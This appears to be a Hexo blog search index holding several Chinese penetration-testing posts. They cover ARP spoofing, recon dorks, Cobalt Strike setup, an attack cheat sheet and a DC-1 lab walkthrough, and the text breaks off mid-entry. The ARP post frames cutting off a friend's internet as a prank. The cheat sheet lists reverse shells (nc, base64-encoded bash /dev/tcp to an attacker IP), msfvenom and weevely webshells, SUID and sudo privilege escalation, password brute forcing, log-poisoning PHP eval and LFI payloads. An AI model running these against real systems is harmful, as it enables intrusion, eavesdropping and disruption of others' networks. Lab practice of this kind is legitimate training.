<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>断网法术之ARP欺骗</title>
    <link href="/2024/05/27/%E6%96%AD%E7%BD%91%E6%B3%95%E6%9C%AF%E4%B9%8BARP%E6%AC%BA%E9%AA%97/"/>
    <url>/2024/05/27/%E6%96%AD%E7%BD%91%E6%B3%95%E6%9C%AF%E4%B9%8BARP%E6%AC%BA%E9%AA%97/</url>
    
    <content type="html"><![CDATA[<p>想整蛊你的死党朋友让上不了网，黑魔法ARP攻击满足你</p><span id="more"></span><h3 id="1-1-ARP协议"><a href="#1-1-ARP协议" class="headerlink" title="1.1 ARP协议"></a>1.1 ARP协议</h3><p>先了解一下什么是ARP攻击</p><p>在局域网中，网络中实际传输的是“帧”，帧里面是有目标主机的MAC地址的。在以太网中，一个主机要和另一个主机进行直接通信，必须要知道目标主机的MAC地址。MAC地址就是ARP协议获得的。其实就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进行。所以说从某种意义上讲ARP协议是工作在更低于IP协议的协议层。这也是为什么ARP欺骗更能够让人在神不知鬼不觉的情况下出现网络故障，危害会很隐蔽。</p><h3 id="2-1-ARP欺骗原理"><a href="#2-1-ARP欺骗原理" class="headerlink" title="2.1 ARP欺骗原理"></a>2.1 ARP欺骗原理</h3><p>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><p>当局域网中一台机器，反复向其他机器，特别是向网关，发送这样无效假冒的ARP应答信息包时，严重的网络堵塞就会开始。由于网关MAC地址错误，所以从网络中计算机发来的数据无法正常发到网关，自然无法正常上网。这就造成了无法访问外网的问题，由于很多时候网关还控制着我们的局域网LAN上网，所以这时我们的LAN访问也就出现问题了。</p><p>3.1 断网攻击</p><p>3.1.1 寻找局域网内存活主机</p><p>测试信息</p><p>攻击机：kaliip：192.168.184.128</p><p>靶机：win10ip：192.168.184.130</p><p>nmap扫描</p><p><code>nmap -sP 192.168.184.*</code></p><p><img src="/%E6%96%AD%E7%BD%91%E6%B3%95%E6%9C%AF%E4%B9%8BARP%E6%AC%BA%E9%AA%97/1716813756191.png" alt="nmap扫描"></p><p>fping探测</p><p><code>fping -g 192.168.184.0/24</code></p><p>3.1.2 查看当前网关</p><p><code>cat etc/resolv.conf</code></p><p><img src="/%E6%96%AD%E7%BD%91%E6%B3%95%E6%9C%AF%E4%B9%8BARP%E6%AC%BA%E9%AA%97/1716813818992.png" alt="查看当前网关"></p><p>3.1.3 发起攻击</p><p>使用arpspoof工具</p><p><code>arpspoof   -i   网卡   -t    目标IP    网关</code></p><p><code>arpspoof -i eth0 -t 192.168.184.130 192.168.184.2</code></p><p><img src="/%E6%96%AD%E7%BD%91%E6%B3%95%E6%9C%AF%E4%B9%8BARP%E6%AC%BA%E9%AA%97/1716813805503.png" alt="发动攻击"></p><p>攻击开始后，win10靶机就断网了</p><p><img src="/%E6%96%AD%E7%BD%91%E6%B3%95%E6%9C%AF%E4%B9%8BARP%E6%AC%BA%E9%AA%97/1716813961484.png" alt="ping百度测试"></p><p>ctrl+Z终止攻击</p><p>补充一点：</p><p>刚方法适用于在同一局域网的目标，如果两台主机同时连接的校园网是大概率不行的，大部分校园网都做了ip隔断，无线用户之间互相隔离</p><h3 id="3-2-ARP欺骗（不断网）"><a href="#3-2-ARP欺骗（不断网）" class="headerlink" title="3.2 ARP欺骗（不断网）"></a>3.2 ARP欺骗（不断网）</h3><p>ARP欺骗攻击是冒充网关向目标主机发送假的ARP数据包。</p><h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><ol><li>获取目标主机的流量</li><li>获取流量之后进行转发</li></ol><p>相当于一个中间人，可以在中途拦截一下流量，这样所有的流量都会被监控</p><p><strong>开启转发功能</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/sys/net/ipv4/ip_forward<br>echo 1 &gt; /proc/sys/net/ipv4/ip_forward（转发）<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">echo</span> 代表写入</span><br>这样可以实现流量转发，而不是截断流量<br>如果要截断流量，写入0即可<br><span class="hljs-meta prompt_">#</span><span class="language-bash">截断流量</span><br>echo 0 &gt;/proc/sys/net/ipv4/ip_forward（断网）<br></code></pre></td></tr></table></figure><p><strong>发起攻击</strong></p><p><code>arpspoof -i eth0 -t 192.168.186.2 192.168.186.131</code>   </p><p>注意这次是网关在前，目标ip在后</p><p><strong>结果</strong></p><p>经过测试后发现，访问http网站时可以拦截流量，而https则不行</p><p>https加密传输，安全性还是挺好的</p><p><strong>这里稍微补充一下HTTP和HTTPS</strong></p><p>1.HTTP是一种发布和接收HTML页面的方法，被用于在Wb浏览器和网站服务器之间传递信息。<br>2.HTTP协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Wb浏览器和<br>网站服务器之间的传输报文，就可以直接读懂其中的信息。<br>3.HTTPS经由HTTP进行通信，但利用SSL&#x2F;TLS来加密数据包。HTTPS开发的主要目的，是提<br>供对网站服务器的身份认证，保护交换数据的隐私与完整性。<br>4.HTTPS(SSL+HTTP)数据传输过程是加密的，安全性较好。</p><h3 id="4-1-如何防御ARP欺骗"><a href="#4-1-如何防御ARP欺骗" class="headerlink" title="4.1 如何防御ARP欺骗"></a>4.1 如何防御ARP欺骗</h3><p><strong>ARP 高速缓存超时设置</strong><br>在ARP高速缓存中的表项一般都要设置超时值，缩短这个这个超时值能够有用的避免ARP表的溢出。</p><p><strong>静态ARP缓存表</strong><br>每台主机都有一个暂时寄存IP-MAC的对应表ARP攻击就经过更改这个缓存来到达诈骗的意图，运用静态的ARP来绑定正确的MAC是一个有用的办法，在命令行下运用arp -a能够检查当<strong>时的ARP缓存表。</strong></p><p>自动查询<br>在某个正常的时间，做一个IP和MAC对应的数据库，以后定时检查当时的IP和MAC对应联系是否正常，定时检查交流机的流量列表，检查丢包率。</p>]]></content>
    
    
    
    <tags>
      
      <tag>实践应用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>google hacking</title>
    <link href="/2024/05/20/google%20hacking/"/>
    <url>/2024/05/20/google%20hacking/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>intext: xxx</p><p>搜索出现在正文中的内容</p><p>intitle: xxx</p><p>搜索出现在标题中的内容</p><p>inurl: xxx</p><p>搜索在url中出现的内容</p><p>filetype:<br>搜索指定类型的文件.例如输入:filetype:asp.将返回所有以asp结尾的文件的URL，可以与其他操作符混合使用</p><p>info:<br>搜索输入URL的摘要信息和其他相关信息，该操作符不能与其他操作符及关键字混用</p><p>持续更新…</p>]]></content>
    
    
    
    <tags>
      
      <tag>技术基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>资产搜集</title>
    <link href="/2024/05/20/%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86/"/>
    <url>/2024/05/20/%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>渗透测试前如何进行资产搜集</p><span id="more"></span><h2 id="一、如何通过测绘平台进行资产收集"><a href="#一、如何通过测绘平台进行资产收集" class="headerlink" title="一、如何通过测绘平台进行资产收集"></a>一、如何通过测绘平台进行资产收集</h2><h3 id="1、子域名搜集"><a href="#1、子域名搜集" class="headerlink" title="1、子域名搜集"></a>1、子域名搜集</h3><p>domain_suffix&#x3D;baidu.com</p><h3 id="2、icon图标搜集"><a href="#2、icon图标搜集" class="headerlink" title="2、icon图标搜集"></a>2、icon图标搜集</h3><p>通过f12检查元素或者其他方法获取到网站的icon</p><p>上传到测绘平台查找匹配的资产，可以和子域名搜索一起使用，锁定目标范围</p><h3 id="3、ICP备案号搜索"><a href="#3、ICP备案号搜索" class="headerlink" title="3、ICP备案号搜索"></a>3、ICP备案号搜索</h3><p>ICP备案号可以算是网站的一个基础特征，传统方式是访问企查查等平台，通过企业名称查看ICP备案号。<br>但测绘平台可以直接通过搜索ICP备案企业名称，来查看ICP备案号，这里还是比较惊喜的。<br>所以我选择了body&#x3D;京ICP证030173号 &amp;&amp; domain_suffix&#x3D;baidu.com</p><h2 id="二、快速搜集薄弱资产"><a href="#二、快速搜集薄弱资产" class="headerlink" title="二、快速搜集薄弱资产"></a>二、快速搜集薄弱资产</h2><h3 id="1、敏感关键词搜索"><a href="#1、敏感关键词搜索" class="headerlink" title="1、敏感关键词搜索"></a>1、敏感关键词搜索</h3><p>检索站点标题可以尝试带有“登录”、“管理”、“后台”、“中心”等关键词，这里我选择的是domain_suffix&#x3D;”baidu.com”&amp;&amp;title&#x3D;”登录”&amp;&amp;title&#x3D;”管理”。或者通过googlehacking，使用intitle:后台</p><h3 id="2、直接输入关键词“Login”"><a href="#2、直接输入关键词“Login”" class="headerlink" title="2、直接输入关键词“Login”"></a>2、直接输入关键词“Login”</h3><h3 id="3、通过C段快速定位未授权端口"><a href="#3、通过C段快速定位未授权端口" class="headerlink" title="3、通过C段快速定位未授权端口"></a>3、通过C段快速定位未授权端口</h3><h3 id="4、通过指纹快速查找问题资产"><a href="#4、通过指纹快速查找问题资产" class="headerlink" title="4、通过指纹快速查找问题资产"></a>4、通过指纹快速查找问题资产</h3><p>在刷问题资产时，可以通过某款特定的CMS或指定的组件，结合检索来提高准确率。</p><p>component_name&#x3D;”Apache Tomcat”</p><h3 id="5、通过指纹扩大疑似存在问题的资产范围"><a href="#5、通过指纹扩大疑似存在问题的资产范围" class="headerlink" title="5、通过指纹扩大疑似存在问题的资产范围"></a>5、通过指纹扩大疑似存在问题的资产范围</h3><p>可以从疑似存在问题的目标资产中提取相应的指纹。例如js，css，组件关键词等信息进行查询。<br>例如：Shiro的rememberMe字段，输入检索语法app&#x3D;”shiro” and body&#x3D;”rememberMe”，即可锁定多个疑似存在相同问题的系统。</p>]]></content>
    
    
    
    <tags>
      
      <tag>技术基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cs服务端搭建及客户端连接</title>
    <link href="/2024/03/21/cs%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5/"/>
    <url>/2024/03/21/cs%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5/</url>
    
    <content type="html"><![CDATA[<blockquote><h3 id="cobaltstrike使用小记"><a href="#cobaltstrike使用小记" class="headerlink" title="cobaltstrike使用小记"></a>cobaltstrike使用小记</h3></blockquote><span id="more"></span><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>#测试可在内网搭建，若想实战则必须搭建于公网上</p><p>第一次使用时搭在自己的kali虚拟机上，跑了半天都没一个上线，后用自己另一个虚拟机测试发现可以上线，当时脑子直接闭环了。后来询问大佬才知道内网搭建只能用于同处于内网的机子，TAT真是蠢极了，不懂原理瞎搞</p><h5 id="cs的搭建"><a href="#cs的搭建" class="headerlink" title="cs的搭建"></a>cs的搭建</h5><p>cs依赖于java，首先得确保有java环境</p><p>先将cs导入服务器</p><p><img src="/img/cs%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5/1711028043531-d985cec7-a311-45f7-be17-19eca0602003.png" alt="img"></p><p>然后使用root权限将teamserver提权</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">777</span> teamserver<br></code></pre></td></tr></table></figure><p><img src="/img/cs%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5/1711028049594-f9d6cc6d-dbdd-49d7-8877-e6086a280496.png" alt="img"></p><p>接着搭建cs</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">./ teamserver <span class="hljs-built_in">IP</span> 密码<br></code></pre></td></tr></table></figure><p><img src="/img/cs%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5/1711028059818-68024391-7e59-44b7-9d33-cd359f5229b8.png" alt="img"></p><p>搭建好后会出现一个密钥，客户端第一次连接时正常会弹出密钥用于确认</p><p>到此为止<strong>服务端</strong>基本搭建结束，打卡实际用客户端连接时遇到了数不尽的问题:&lt;</p><h5 id="搭建及连接的常见问题"><a href="#搭建及连接的常见问题" class="headerlink" title="搭建及连接的常见问题"></a>搭建及连接的常见问题</h5><h6 id="一、拒绝连接（connecting-refuse），最最大坑"><a href="#一、拒绝连接（connecting-refuse），最最大坑" class="headerlink" title="一、拒绝连接（connecting refuse），最最大坑"></a>一、拒绝连接（connecting refuse），最最大坑</h6><p><img src="/img/cs%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5/1711028074530-e36b9dcf-ddfb-4f27-9fc7-03bf6fcbcfb7.png" alt="img"></p><p>1、服务端未搭建好时会出现此状况</p><p>2、未开启50050端口</p><p>3、防火墙是否放行端口</p><p><em><strong>服务器内开</strong></em></p><p>第一次做测试用的centos7.6</p><p>1）开启防火墙</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">systemctl start firewalld<br></code></pre></td></tr></table></figure><p>2）开放指定端口</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs latex">firewall-cmd --zone=public --add-port=50050/tcp --permanent<br>命令含义：<br>    --zone <span class="hljs-params">#</span>作用域<br>    --add-port=1935/tcp  <span class="hljs-params">#</span>添加端口，格式为：端口/通讯协议<br>    --permanent  <span class="hljs-params">#</span>永久生效，没有此参数重启后失效<br></code></pre></td></tr></table></figure><p>3）重启防火墙</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">firewall-cmd --reload<br></code></pre></td></tr></table></figure><p>4）查看端口号</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs latex">netstat -ntlp   //查看当前所有tcp端口·<br>netstat -ntulp |grep 1935   //查看所有1935端口使用情况·<br>ps 进程号    //进一步查看进程详细信息<br>kill -9 进程号    //终止进程<br></code></pre></td></tr></table></figure><p><em><strong>服务器外云控制台</strong></em></p><p><img src="/img/cs%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5/1711028097830-6357fbcf-8dae-4489-bf03-8603c3839199.png" alt="img"></p><p>测试时用的腾讯云的服务器，去轻量应用服务器的防火墙添加50050通行端口（一般出口不受限制，多半控制入口）</p>]]></content>
    
    
    
    <tags>
      
      <tag>技术基础</tag>
      
      <tag>cobaltstrike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打靶后个人的一些总结</title>
    <link href="/2024/03/21/%E6%89%93%E9%9D%B6%E5%90%8E%E4%B8%AA%E4%BA%BA%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/"/>
    <url>/2024/03/21/%E6%89%93%E9%9D%B6%E5%90%8E%E4%B8%AA%E4%BA%BA%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><!--more--><h2 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1.  信息搜集"></a>1.  信息搜集</h2><p>做渗透测试，首先最基础的也是最重要的是信息搜集，良好的信息情报是成功的第一步</p><h3 id="1-1-端口扫描工具"><a href="#1-1-端口扫描工具" class="headerlink" title="1.1. 端口扫描工具"></a>1.1. 端口扫描工具</h3><p><strong>nmap：</strong></p><p>常用扫描类型：<a href="https://blog.csdn.net/qq_37964989/article/details/84330693">Nmap常用命令总结_nmap -ss-CSDN博客</a></p><p>常用的端口：</p><p>80，默认访问</p><p>21，可能有文件可以通过ftp匿名下载</p><p>22，ssh</p><p>8080，</p><p>注意一些不常见的端口，存在漏洞或泄露信息的可能性较大</p><h3 id="1-2-整站扫描工具"><a href="#1-2-整站扫描工具" class="headerlink" title="1.2. 整站扫描工具"></a>1.2. 整站扫描工具</h3><p>nikto：nikto -h ip</p><p>owasp-zap：图形化扫描工具</p><p>dirb</p><p>gobuster：端口内容扫描工具</p><p><strong>gobuster dir -u <a href="http://ip:端口">http://ip:端口</a> -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;bing.txt</strong>    </p><p>#后面的是字典</p><p>curl：搜寻网站所支持的内容</p><p>whatweb：网站类型扫描工具</p><h3 id="1-3-特殊类型网站扫描工具"><a href="#1-3-特殊类型网站扫描工具" class="headerlink" title="1.3. 特殊类型网站扫描工具"></a>1.3. 特殊类型网站扫描工具</h3><p>wpsacn：扫描wordpress网站</p><p>joomscan：扫描joomla网站</p><h2 id="2-shell获取"><a href="#2-shell获取" class="headerlink" title="2. shell获取"></a>2. shell获取</h2><h3 id="2-1-nc反弹shell"><a href="#2-1-nc反弹shell" class="headerlink" title="2.1. nc反弹shell"></a>2.1. nc反弹shell</h3><p>通过将靶机的命令行转发到攻击机以获取权限</p><p>靶机：<strong>nc [攻击机ip] [端口] -e &#x2F;bin&#x2F;bash</strong></p><p>攻击机：<strong>nc -lvp [端口]</strong></p><h3 id="2-2-msf"><a href="#2-2-msf" class="headerlink" title="2.2. msf"></a>2.2. msf</h3><p><strong>msfconsle</strong></p><p>进入msf操作框架，可实现搜索漏洞并攻击，设置监听等功能</p><p>常用监听命令：</p><p><strong>use exploit&#x2F;multi&#x2F;hander</strong></p><p><strong>set payload php&#x2F;meterpreter&#x2F;reverse_tcp</strong></p><p><strong>set lhost 攻击机ip</strong></p><p><strong>set lport 4444</strong></p><p><strong>run</strong></p><p><strong>搜索漏洞：</strong></p><p>search 漏洞名</p><p>use 漏洞地址</p><p><strong>msfvenom</strong></p><p>生成木马工具，搭配使用</p><p><strong>msfvenom -p php&#x2F;meterpreter&#x2F;reverser_tcp lhost&#x3D;攻击机ip lport&#x3D;4444 -f raw &gt; &#x2F;root&#x2F;msfshell.php</strong></p><h3 id="2-3-weevely"><a href="#2-3-weevely" class="headerlink" title="2.3. weevely"></a>2.3. weevely</h3><p>生成、连接木马工具</p><p>生成：<strong>weevely generate 123456 haha.php</strong></p><p>连接：<strong>weevely http:&#x2F;&#x2F;木马地址 123456</strong></p><h2 id="3-密码破解"><a href="#3-密码破解" class="headerlink" title="3. 密码破解"></a>3. 密码破解</h2><h3 id="3-1-burp暴力破解"><a href="#3-1-burp暴力破解" class="headerlink" title="3.1. burp暴力破解"></a>3.1. burp暴力破解</h3><p>没什么好说的，准备好充足的字典即可</p><h3 id="3-2-cewl"><a href="#3-2-cewl" class="headerlink" title="3.2. cewl"></a>3.2. cewl</h3><p>搜集可能存在的密码</p><p><strong>cewl 域名 -w passwd.txt</strong></p><h3 id="3-3-wpscan"><a href="#3-3-wpscan" class="headerlink" title="3.3. wpscan"></a>3.3. wpscan</h3><p>破解wordpress站的密码</p><p><strong>wpscan –url 域名 -U username.txt -P passwd.txt</strong></p><h3 id="3-4-hydra"><a href="#3-4-hydra" class="headerlink" title="3.4. hydra"></a>3.4. hydra</h3><p>破解ssh密码</p><p><strong>hydra -L username.txt -P passwd.txt [ip地址] ssh -s 7744</strong></p><h3 id="3-5-john"><a href="#3-5-john" class="headerlink" title="3.5. john"></a>3.5. john</h3><p><strong>john mima.txt</strong></p><h2 id="4-权限提升"><a href="#4-权限提升" class="headerlink" title="4. 权限提升"></a>4. 权限提升</h2><h3 id="4-1-搜索漏洞提权"><a href="#4-1-搜索漏洞提权" class="headerlink" title="4.1. 搜索漏洞提权"></a>4.1. 搜索漏洞提权</h3><p><strong>sudo -l</strong>    </p><p><strong>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</strong></p><p>查看有什么能以root权限执行</p><p>或者查看系统名及版本</p><p><strong>uname -a</strong></p><p>接着</p><p><strong>searchsploit 名称</strong></p><p>搜索相关漏洞</p><h4 id="4-1-1-常见漏洞"><a href="#4-1-1-常见漏洞" class="headerlink" title="4.1.1. 常见漏洞"></a>4.1.1. 常见漏洞</h4><h5 id="4-1-1-1-find"><a href="#4-1-1-1-find" class="headerlink" title="4.1.1.1. find"></a>4.1.1.1. find</h5><p>创建一个名为hah的文件</p><p><strong>touch hah</strong></p><p>查找并执行命令                                                                                                 </p><p>*<em>find &#x2F; -name hah -exec “&#x2F;bin&#x2F;sh” *</em></p><h5 id="4-1-1-2-perl"><a href="#4-1-1-2-perl" class="headerlink" title="4.1.1.2. perl"></a>4.1.1.2. perl</h5><p>sudo perl -e “exec’bin&#x2F;sh’”</p><h5 id="4-1-1-3-teehee-ssh"><a href="#4-1-1-3-teehee-ssh" class="headerlink" title="4.1.1.3. teehee(ssh)"></a>4.1.1.3. teehee(ssh)</h5><p>sudo teehee &#x2F;etc&#x2F;crontab        #teehee是一个可以写文件的东西</p><p>* * * * * root chmod 4777 &#x2F;bin&#x2F;sh    #每分钟执行一次，定时提权</p><h3 id="4-2-命令行提权"><a href="#4-2-命令行提权" class="headerlink" title="4.2. 命令行提权"></a>4.2. 命令行提权</h3><p><strong>echo $PATH</strong>    #查看当前的命令行</p><p><strong>BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh</strong>#按下键盘a就可以调用&#x2F;bin&#x2F;sh命令行</p><p>&#x2F;bin&#x2F;bash（kali中常用的命令行）</p><p><strong>export PATH&#x3D;PATH:&#x2F;bin</strong></p><p><strong>export PATH&#x3D;PATH:&#x2F;sbin:&#x2F;bin</strong></p><p>#把高级权限的命令行也加到自己的path（环境变量）里</p><h3 id="4-3-git提权"><a href="#4-3-git提权" class="headerlink" title="4.3. git提权"></a>4.3. git提权</h3><p>git提权，下面两条都可以用</p><p><strong>sudo git -p –help</strong></p><p><strong>sudo git help config</strong>  #任选一条</p><p>git命令在查看帮助文档的时候可以敲命令，命令格式为[!+命令]</p><p>每一次输命令都要！+命令，就是借用git的root权限执行命令</p><h2 id="5-其他"><a href="#5-其他" class="headerlink" title="5. 其他"></a>5. 其他</h2><h3 id="5-1-ssh漏洞"><a href="#5-1-ssh漏洞" class="headerlink" title="5.1. ssh漏洞"></a>5.1. ssh漏洞</h3><p>免登录执行</p><p><strong>ssh 用户名@localhost 命令</strong></p><p><strong>ssh ‘<?php eval($_GET['a'])?>‘@xxx.xxx.xxx.xxx</strong></p><h3 id="5-2-修改drupal管理员密码"><a href="#5-2-修改drupal管理员密码" class="headerlink" title="5.2. 修改drupal管理员密码"></a>5.2. 修改drupal管理员密码</h3><p>drush user-password admin –password&#x3D;”123456”</p><h3 id="5-3-下载命令"><a href="#5-3-下载命令" class="headerlink" title="5.3. 下载命令"></a>5.3. 下载命令</h3><p>wget </p><h3 id="5-4-nc被屏蔽掉的情况"><a href="#5-4-nc被屏蔽掉的情况" class="headerlink" title="5.4. nc被屏蔽掉的情况"></a>5.4. nc被屏蔽掉的情况</h3><p>执行如下命令后会出现一串编码</p><p><strong>echo ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机ip&#x2F;1234 0&gt;&amp;1’ | base64</strong></p><p>在漏洞处</p><p><strong>echo 编码 | base64 -d|bash</strong></p><h3 id="5-5-域名屏蔽"><a href="#5-5-域名屏蔽" class="headerlink" title="5.5. 域名屏蔽"></a>5.5. 域名屏蔽</h3><p>有的网站无法通过ip地址直接访问</p><p>在&#x2F;root&#x2F;hosts中添加</p><p><strong>ip地址 域名</strong></p><h3 id="5-6-文件包含漏洞利用"><a href="#5-6-文件包含漏洞利用" class="headerlink" title="5.6. 文件包含漏洞利用"></a>5.6. 文件包含漏洞利用</h3><p>查看密码</p><p><strong>file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</strong> </p><p>查看源码</p><p><strong>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</strong></p><p>ssh登录日志</p><p><strong>file&#x3D;&#x2F;var&#x2F;log&#x2F;auth.log</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>反思总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对druplal搭建的网站进行渗透测试</title>
    <link href="/2024/03/19/DC-1/"/>
    <url>/2024/03/19/DC-1/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>nmap扫描</p><p>nmap -sV -p- 172.20.10.9</p><p>并没有什么收获</p><p>尝试用户密码无果</p><p>因Druqal为比较出名的一个cms网站</p><p>于是尝试在msf中搜素Druqal相关漏洞</p><p>msfconsole</p><p>search Druqal</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709198189894-9248e02e-34a7-4a0b-945c-7a0bc2908d41.png" alt="img"></p><p>尝试使用exp，发现1号漏洞有效</p><p>use exploit&#x2F;unix&#x2F;webapp&#x2F;druqal_druqalgeddon2</p><p>show options</p><p>配置相关信息</p><p>set rhosts 172.20.10.9</p><p>发起攻击</p><p>exploit&#x2F;run</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709198923312-ad4ad043-b653-41d3-828b-41031412e810.png" alt="img"></p><p>输入shell即可执行相关操作</p><p>cat &#x2F;etc&#x2F;passwd</p><p>查看passwd，发现flag4这个用户</p><p>cat &#x2F;etc&#x2F;shadow</p><p>查看shadow，发现没有权限</p><p>尝试去破解一下flag4的密码</p><p>使用hydra破解</p><p>hydra -1 flag4 -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz 172.20.10.9 ssh</p><p>#破解ssh协议</p><p>密码字典位置&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709205366050-bc00adc5-ac20-43e5-b1a9-aef0ae5dcffe.png" alt="img"></p><p>发现flag4密码为orange</p><p>使用ssh登录</p><p>ssh <a href="mailto:&#x66;&#x6c;&#97;&#103;&#x34;&#x40;&#49;&#x37;&#x32;&#x2e;&#x32;&#48;&#46;&#49;&#x30;&#46;&#x39;">&#x66;&#x6c;&#97;&#103;&#x34;&#x40;&#49;&#x37;&#x32;&#x2e;&#x32;&#48;&#46;&#49;&#x30;&#46;&#x39;</a></p><p>接着需要提权到root权限</p><p>cd &#x2F;root <img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709205797156-4cdc4dcc-dbac-409e-ab58-7afad76e9a0e.png" alt="img"></p><p>发现被阻止了</p><p>find &#x2F;root</p><p>成功看到root目录下的文件</p><p>提权</p><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p>发现有什么东西可以以root权限执行</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709206219800-b69d5e2a-4dcb-44f8-a6b2-1dd0dc87014a.png" alt="img"></p><p>发现&#x2F;usr&#x2F;bin&#x2F;find</p><p>创建一个名为hah的文件</p><p>touch hah</p><p>查找并执行命令</p><p>find &#x2F; -name hah -exec “&#x2F;bin&#x2F;sh” \</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709206544917-492f36e6-af0f-452f-8cb4-cacb5de4c7ac.png" alt="img"></p><p>whoami发现已经是root权限了</p><p>查看Druqal默认配置文件(关键目录)</p><p>cat var&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php</p><p>发现数据库用户和密码<img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709199277669-c494d586-fc89-458f-b4dd-7ce12fdff9be.png" alt="img"></p><p>python -c ‘import pty;pty.spawn (“&#x2F;bin&#x2F;bash”)’</p><p>#ps：美化命令界面</p><p>尝试登录数据库</p><p>mysql -u dbuser -p R0ck3t</p><p>查看数据库</p><p>show databases;</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709199796134-e093c0c8-8c78-4fd9-80bd-700f21c7cb29.png" alt="img"></p><p>use drupaldb;</p><p>会发现有很多表</p><p>查看users这个表</p><p>select * from user;</p><p>发现有很多用户和加密过的密码</p><p>接下来去拿到数据库的控制权限，两种方法：</p><p>方法1：</p><p>在数据库里建立一个管理员级别的用户</p><p>php scripts&#x2F;password-hash.sh 密码</p><p>使用drupal的密码生成工具自动生成密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709203934190-a901b6c0-73f5-4503-bb92-09e313ae2790.png" 